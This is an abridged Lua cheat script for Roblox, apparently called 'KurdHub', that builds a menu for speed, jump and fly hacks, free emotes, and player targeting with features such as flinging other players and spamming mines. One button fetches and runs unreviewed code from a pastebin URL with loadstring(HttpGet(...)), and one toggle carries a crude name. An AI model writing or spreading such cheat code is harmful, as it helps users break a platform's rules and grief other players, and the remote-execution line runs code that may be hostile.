...
if game.CoreGui:FindFirstChild("SysBroker") then
	game:GetService("StarterGui"):SetCore("SendNotification", {Title = "KurdHub",Text = "Welcome to KurdHub",Duration = 5;})
	return
end
local version = 2
--VARIABLES
...
TekdaneServer_Button.Name = "FreePushTool_Button"
TekdaneServer_Button.Parent = Game_Section
TekdaneServer_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
TekdaneServer_Button.BackgroundTransparency = 0.500
TekdaneServer_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
TekdaneServer_Button.BorderSizePixel = 0
TekdaneServer_Button.Position = UDim2.new(0, 210, 0, 175)
TekdaneServer_Button.Size = UDim2.new(0, 150, 0, 30)
TekdaneServer_Button.Font = Enum.Font.Oswald
TekdaneServer_Button.Text = "Server tekdan"
TekdaneServer_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
TekdaneServer_Button.TextScaled = true
TekdaneServer_Button.TextSize = 14.000
TekdaneServer_Button.TextWrapped = true
...
Welcome_Label.Text = ("Dast xosh "..plr.Name.."Bo bakar henane script")
...
Announce_Label.Text = "developed by best Developers"
...
Crown.Image = "rbxassetid://122159246308907"
...
OpenClose.Image = "rbxassetid://122159246308907"
...
local function UpdateTarget(player)
	pcall(function()
		if table.find(ForceWhitelist,player.UserId) then
			SendNotify("KurdHub","You cant target this player: @"..player.Name.." / "..player.DisplayName,5)
			player = nil
		end
	end)
	if (player ~= nil) then
...
TekdaneServer_Button.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://pastebin.com/raw/q9QLzAk2'))()
end)
...
CMDBar.FocusLost:Connect(function()
	...
	SendNotify("KurdHub",("Executed "..command),5)
	CMDBar.Text = ""
end)
...
WalkSpeed_Button.MouseButton1Click:Connect(function()
	pcall(function()
		...
		SendNotify("KurdHub","Walk speed updated.",5)
	end)
end)
...
JumpPower_Button.MouseButton1Click:Connect(function()
	pcall(function()
		...
		SendNotify("KurdHub","Jump power updated.",5)
	end)
end)
...
FlySpeed_Button.MouseButton1Click:Connect(function()
	pcall(function()
		...
		SendNotify("KurdHub","Fly speed updated.",5)
	end)
end)
...
SaveCheckpoint_Button.MouseButton1Click:Connect(function()
	...
	SendNotify("KurdHub","Checkpoint saved.",5)
end)

ClearCheckpoint_Button.MouseButton1Click:Connect(function()
	SavedCheckpoint = nil
	SendNotify("KurdHub","Checkpoint cleared.",5)
end)
...
WhitelistTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		if table.find(ScriptWhitelist, Players[TargetedPlayer].UserId) then
			...
			SendNotify("KurdHub",TargetedPlayer.." removed from whitelist.",5)
		else
			table.insert(ScriptWhitelist, Players[TargetedPlayer].UserId)
			SendNotify("KurdHub",TargetedPlayer.." added to whitelist.", 5)
		end
	end
end)
...
Day_Button.MouseButton1Click:Connect(function()
	if Shaders_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0) then
		...
		SendNotify("KurdHub","Please turn off shaders.",5)
	end
end)
...
FreeEmotes_Button.MouseButton1Click:Connect(function()
	if not FreeEmotesEnabled then
		...
		SendNotify("KurdHub","Loading free emotes.\nCredits: Gi#7331")
...
Players.PlayerRemoving:Connect(function(player)
	pcall(function()
		if player.Name == TargetedPlayer then
			UpdateTarget(nil)
			SendNotify("KurdHub","Targeted player left/rejoined.",5)
		end
	end)
end)
...
plr.CharacterAdded:Connect(function(x)
	...
	if PotionDi_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(PotionDi_Button)
		SendNotify("KurdHub","PotionDick was automatically disabled due to your character respawn",5)
	end
	if PotionFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(PotionFling_Button)
		SendNotify("KurdHub","PotionFling was automatically disabled due to your character respawn",5)
	end
	if AntiRagdoll_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(AntiRagdoll_Button)
		SendNotify("KurdHub","AntiRagdoll was automatically disabled due to your character respawn",5)
	end
	if SpamMines_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(SpamMines_Button)
		SendNotify("KurdHub","SpamMines was automatically disabled due to your character respawn",5)
	end
	if Fly_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(Fly_Button)
		flying = false
		...
		KeyDownFunction:Disconnect()
		KeyUpFunction:Disconnect()
		SendNotify("KurdHub","Fly was automatically disabled due to your character respawn",5)
	end
	...
	while task.wait(10) do
		pcall(function()
			...
			if version<GuiVersion then
				SendNotify("KurdHub","You are not using the latest version, please run the script again.",5)
				task.wait(5)
				SysBroker:Destroy()
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
			end
